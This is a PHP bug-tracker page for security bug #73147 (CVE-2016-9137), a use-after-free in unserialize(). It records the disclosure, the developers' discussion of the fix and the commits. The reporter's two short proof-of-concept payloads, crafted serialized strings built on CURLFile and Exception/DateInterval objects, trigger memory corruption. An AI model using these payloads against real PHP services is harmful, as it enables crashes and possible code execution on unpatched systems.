<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    
        <link rel='alternate' type='application/rss+xml' title='*General Issues Bug #73147 - RDF' href='rss/bug.php?id=73147'>
        <link rel='alternate' type='application/rss+xml' title='*General Issues Bug #73147 - RSS 2.0' href='rss/bug.php?id=73147&format=rss2'>
        <base href="https://bugs.php.net/">
    <title>PHP :: Sec Bug #73147 :: Use After Free in unserialize()</title>
    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
</head>

<body>

<table id="top" class="head" cellspacing="0" cellpadding="0">
    <tr>
        <td class="head-logo">
            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
        </td>

        <td class="head-menu">
            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
            <a href="random">random bug</a>&nbsp;|&nbsp;
            <a href="login.php">login</a>
        </td>
    </tr>

    <tr>
        <td class="head-search" colspan="2">
            <form method="get" action="search.php">
                <p class="head-search">
                    <input type="hidden" name="cmd" value="display">
                    <small>go to bug id or search bugs for</small>
                    <input class="small" type="text" name="search_for" value="" size="30">
                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
                </p>
            </form>
        </td>
    </tr>
</table>

<table class="middle" cellspacing="0" cellpadding="0">
    <tr>
        <td class="content">
<div id="bugheader">
    <table id="details">
        <tr id="title">
            <th class="details" id="number"><a href="bug.php?id=73147">Sec Bug</a>&nbsp;#73147</th>
            <td id="summary" colspan="5">Use After Free in unserialize()</td>
        </tr>
        <tr id="submission">
            <th class="details">Submitted:</th>
            <td style="white-space: nowrap;">2016-09-23 13:22 UTC</td>
            <th class="details">Modified:</th>
            <td style="white-space: nowrap;">2016-11-02 09:25 UTC</td>
            <td rowspan="6">


            </td>
        </tr>

        <tr id="submitter">
            <th class="details">From:</th>
            <td>taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</td>
            <th class="details">Assigned:</th>
            <td><a href="search.php?cmd=display&amp;assign=stas">stas</a> (<a href="https://people.php.net/stas">profile</a>)</td>
        </tr>

        <tr id="categorization">
            <th class="details">Status:</th>
            <td>Closed</td>
            <th class="details">Package:</th>
            <td><a href="search.php?cmd=display&amp;package_name[]=%2AGeneral+Issues">*General Issues</a></td>
        </tr>

        <tr id="situation">
            <th class="details">PHP Version:</th>
            <td>5.6.26</td>
            <th class="details">OS:</th>
            <td></td>
        </tr>

        <tr id="private">
            <th class="details">Private report:</th>
            <td>No</td>
            <th class="details">CVE-ID:</th>
            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9137" target="_blank">2016-9137</a></td>
        </tr>
    </table>
</div>

<div class="controls">
<span id='control_0' class='control active'>View</span>
<span id='control_3' class='control'><a href='bug.php?id=73147&amp;edit=3'>Add Comment</a></span>
<span id='control_1' class='control'><a href='bug.php?id=73147&amp;edit=1'>Developer</a></span>
<span id='control_2' class='control'><a href='bug.php?id=73147&amp;edit=2'>Edit</a></span>
</div>
<div class="clear"></div>



<div class='comment type_comment' ><a name="1474636977">&nbsp;</a><strong>[2016-09-23 13:22 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>Description:
------------
PoC:
```
&lt;?php

$poc = 'a:1:{i:0;O:8:&quot;CURLFile&quot;:1:{s:4:&quot;name&quot;;R:1;}}';
unserialize($poc);

?&gt;
```


</pre>
</div><h2>Patches</h2>
<a href="patch-display.php?bug_id=73147&amp;patch=1&amp;revision=latest" >1</a>
(last revision 2019-09-06 03:41 UTC by 825307076 &#x61;&#116; qq &#x64;&#111;&#x74; com)
<br><a href="patch-display.php?bug_id=73147&amp;patch=demo17&amp;revision=latest" >demo17</a>
(last revision 2019-06-06 06:46 UTC by 417177366 &#x61;&#116; qq &#x64;&#111;&#x74; com)
<br><p><a href='patch-add.php?bug_id=73147'>Add a Patch</a></p><h2>Pull Requests</h2>
<p><a href='gh-pull-add.php?bug_id=73147'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
            <div id='comments_view' style='clear:both;'>
<div class='comment type_log' ><a name="1474858506">&nbsp;</a><strong>[2016-09-26 02:55 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-PHP Version: 7.0.11</span>
<span class="added">+PHP Version: 5.6.26</span>
<span class="removed">-Assigned To:</span>
<span class="added">+Assigned To: stas</span>
<span class="removed">-CVE-ID:</span>
<span class="added">+CVE-ID:      needed</span>
</div></div></div><div class='comment type_comment' ><a name="1474858506">&nbsp;</a><strong>[2016-09-26 02:55 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>The fix is in security repo as 0e6fe3a4c96be2d3e88389a5776f878021b4c59f and in <a href="https://gist.github.com/57d761ebfeed962fe7ffb498348f2965" rel="nofollow">https://gist.github.com/57d761ebfeed962fe7ffb498348f2965</a>

please verify
</pre>
</div><div class='comment type_comment' ><a name="1474888248">&nbsp;</a><strong>[2016-09-26 11:10 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>The similar bug can be also triggered via Exception::__toString with DateInterval::__wakeup

```
ZEND_METHOD(exception, __toString)
{
...
	zend_update_property_str(base_ce, exception, &quot;string&quot;, sizeof(&quot;string&quot;)-1, str);
```

PoC:
```
&lt;?php

$poc = 'O:9:&quot;Exception&quot;:2:{S:17:&quot;\00Exception\00string&quot;;R:1;i:0;O:12:&quot;DateInterval&quot;:1:{s:4:&quot;days&quot;;R:1;}}';
unserialize($poc);

?&gt;
```
</pre>
</div><div class='comment type_comment' ><a name="1474918936">&nbsp;</a><strong>[2016-09-26 19:42 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Hmmm... I suspect there might be also other places, I'm not sure how to handle this problem in general, as reference allows to overwrite anything, by definition, that's how reference is supposed to work.
</pre>
</div><div class='comment type_comment' ><a name="1474929003">&nbsp;</a><strong>[2016-09-26 22:30 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>the follow patch can fix this bug:

```
+	zval tmp;
+	ZVAL_STRINGL(&amp;tmp, &quot;string&quot;, sizeof(&quot;string&quot;) - 1);
+	Z_OBJ_HANDLER_P(exception, unset_property)(exception, &amp;tmp, NULL);
+	zval_ptr_dtor(&amp;tmp);
	zend_update_property_str(base_ce, exception, &quot;string&quot;, sizeof(&quot;string&quot;)-1, str);
```
</pre>
</div><div class='comment type_comment' ><a name="1474929347">&nbsp;</a><strong>[2016-09-26 22:35 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Yes, I know this particular one can be easily fixed. The problem is that every __wakeup that modifies any property would produce the same problem.
</pre>
</div><div class='comment type_comment' ><a name="1474929718">&nbsp;</a><strong>[2016-09-26 22:41 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>You can handle the DateInterval::__wakeup() like PHP5.
</pre>
</div><div class='comment type_svn' ><a name="1476229550">&nbsp;</a><strong>[2016-10-11 23:45 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=0e6fe3a4c96be2d3e88389a5776f878021b4c59f" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=0e6fe3a4c96be2d3e88389a5776f878021b4c59f</a>
Log: Fix <a href='bug.php?id=73147'>bug #73147</a>: Use After Free in PHP7 unserialize()
</pre>
</div><div class='comment type_log' ><a name="1476229551">&nbsp;</a><strong>[2016-10-11 23:45 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status: Assigned</span>
<span class="added">+Status: Closed</span>
</div></div></div><div class='comment type_svn' ><a name="1476287853">&nbsp;</a><strong>[2016-10-12 15:57 UTC] <a href="//people.php.net/ab">ab@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=f42cbd749cde1f91274c1d03df9024baba141a8f" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=f42cbd749cde1f91274c1d03df9024baba141a8f</a>
Log: Fix <a href='bug.php?id=73147'>bug #73147</a>: Use After Free in PHP7 unserialize()
</pre>
</div><div class='comment type_svn' ><a name="1476314797">&nbsp;</a><strong>[2016-10-12 23:26 UTC] <a href="//people.php.net/ab">ab@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=d13507d2e6d7c280888cc9c3cab125b347662e90" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=d13507d2e6d7c280888cc9c3cab125b347662e90</a>
Log: Fix <a href='bug.php?id=73147'>bug #73147</a>: Use After Free in PHP7 unserialize()
</pre>
</div><div class='comment type_svn' ><a name="1476315342">&nbsp;</a><strong>[2016-10-12 23:35 UTC] <a href="//people.php.net/ab">ab@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=0e6fe3a4c96be2d3e88389a5776f878021b4c59f" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=0e6fe3a4c96be2d3e88389a5776f878021b4c59f</a>
Log: Fix <a href='bug.php?id=73147'>bug #73147</a>: Use After Free in PHP7 unserialize()
</pre>
</div><div class='comment type_svn' ><a name="1476406929">&nbsp;</a><strong>[2016-10-14 01:02 UTC] <a href="//people.php.net/ab">ab@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=54003ab6631b489af54631a548597e8bd599b266" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=54003ab6631b489af54631a548597e8bd599b266</a>
Log: Fix <a href='bug.php?id=73147'>bug #73147</a>: Use After Free in PHP7 unserialize()
</pre>
</div><div class='comment type_svn' ><a name="1476411778">&nbsp;</a><strong>[2016-10-14 02:22 UTC] <a href="//people.php.net/ab">ab@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=f42cbd749cde1f91274c1d03df9024baba141a8f" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=f42cbd749cde1f91274c1d03df9024baba141a8f</a>
Log: Fix <a href='bug.php?id=73147'>bug #73147</a>: Use After Free in PHP7 unserialize()
</pre>
</div><div class='comment type_svn' ><a name="1476411793">&nbsp;</a><strong>[2016-10-14 02:23 UTC] <a href="//people.php.net/ab">ab@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=0e6fe3a4c96be2d3e88389a5776f878021b4c59f" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=0e6fe3a4c96be2d3e88389a5776f878021b4c59f</a>
Log: Fix <a href='bug.php?id=73147'>bug #73147</a>: Use After Free in PHP7 unserialize()
</pre>
</div><div class='comment type_svn' ><a name="1476411799">&nbsp;</a><strong>[2016-10-14 02:23 UTC] <a href="//people.php.net/ab">ab@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=54003ab6631b489af54631a548597e8bd599b266" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=54003ab6631b489af54631a548597e8bd599b266</a>
Log: Fix <a href='bug.php?id=73147'>bug #73147</a>: Use After Free in PHP7 unserialize()
</pre>
</div><div class='comment type_log' ><a name="1476424859">&nbsp;</a><strong>[2016-10-14 06:00 UTC] <a href="//people.php.net/tyrael">tyrael@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Summary: Use After Free in PHP7 unserialize()</span>
<span class="added">+Summary: Use After Free in unserialize()</span>
</div></div></div><div class='comment type_svn' ><a name="1476698814">&nbsp;</a><strong>[2016-10-17 10:06 UTC] <a href="//people.php.net/bwoebi">bwoebi@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=54003ab6631b489af54631a548597e8bd599b266" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=54003ab6631b489af54631a548597e8bd599b266</a>
Log: Fix <a href='bug.php?id=73147'>bug #73147</a>: Use After Free in PHP7 unserialize()
</pre>
</div><div class='comment type_svn' ><a name="1476698831">&nbsp;</a><strong>[2016-10-17 10:07 UTC] <a href="//people.php.net/bwoebi">bwoebi@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=f42cbd749cde1f91274c1d03df9024baba141a8f" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=f42cbd749cde1f91274c1d03df9024baba141a8f</a>
Log: Fix <a href='bug.php?id=73147'>bug #73147</a>: Use After Free in PHP7 unserialize()
</pre>
</div><div class='comment type_svn' ><a name="1476698866">&nbsp;</a><strong>[2016-10-17 10:07 UTC] <a href="//people.php.net/bwoebi">bwoebi@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=0e6fe3a4c96be2d3e88389a5776f878021b4c59f" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=0e6fe3a4c96be2d3e88389a5776f878021b4c59f</a>
Log: Fix <a href='bug.php?id=73147'>bug #73147</a>: Use After Free in PHP7 unserialize()
</pre>
</div><div class='comment type_log' ><a name="1478078748">&nbsp;</a><strong>[2016-11-02 09:25 UTC] <a href="//people.php.net/kaplan">kaplan@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-CVE-ID: needed</span>
<span class="added">+CVE-ID: 2016-9137</span>
</div></div></div><div class='comment type_comment' ><a name="1478078748">&nbsp;</a><strong>[2016-11-02 09:25 UTC] <a href="//people.php.net/kaplan">kaplan@php.net</a></strong>
<pre class='note'>From CVE-assign:
&quot;Use CVE-2016-9137 for the ext/curl/curl_file.c vulnerability that was
fixed in 5.6.27 and 7.0.12.

Use CVE-2016-9138 for the remaining security problem associated with
__wakeup that is still present in 5.6.27 and 7.0.12.&quot;
</pre>
</div><div class='comment type_patch' ><a name="1559803573">&nbsp;</a><strong>[2019-06-06 06:46 UTC] 417177366 &#x61;&#116; qq &#x64;&#111;&#x74; com</strong>
<pre class='note'>The following patch has been added/updated:

Patch Name: demo17
Revision:   1559803573
URL:        <a href="https://bugs.php.net/patch-display.php?bug=73147&amp;patch=demo17&amp;revision=1559803573" rel="nofollow">https://bugs.php.net/patch-display.php?bug=73147&amp;patch=demo17&amp;revision=1559803573</a>
</pre>
</div><div class='comment type_patch' ><a name="1567741285">&nbsp;</a><strong>[2019-09-06 03:41 UTC] 825307076 &#x61;&#116; qq &#x64;&#111;&#x74; com</strong>
<pre class='note'>The following patch has been added/updated:

Patch Name: 1
Revision:   1567741285
URL:        <a href="https://bugs.php.net/patch-display.php?bug=73147&amp;patch=1&amp;revision=1567741285" rel="nofollow">https://bugs.php.net/patch-display.php?bug=73147&amp;patch=1&amp;revision=1567741285</a>
</pre>
</div></div>
        </td>
    </tr>
</table>

<script src='js/util.js'></script>
<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
<script src="js/jquery.cookie.js"></script>
<script>
function do_comment(nd)
{
    $('#comment_filter > .control.active').removeClass("active");
    $(nd).addClass("active");

    $.cookie('history_tab', nd.id, { expires: 365 });

    if (nd.id == 'type_all') {
        $('#comments_view > .comment:hidden').show('slow');
    } else {
        $('#comments_view > .comment').each(function(i) {
            if ($(this).hasClass(nd.id)) {
                $(this).show('slow');
            } else {
                $(this).hide('slow');
            }
        });
    }
    return false;
}
</script>
<table class="foot" cellspacing="0" cellpadding="0">
    <tr>
        <td class="foot-bar" colspan="2">&nbsp;</td>
    </tr>

    <tr>
        <td class="foot-copy">
            <small>
                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
                All rights reserved.
            </small>
        </td>
        <td class="foot-source">
            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
        </td>
    </tr>
</table>
</body>
</html>
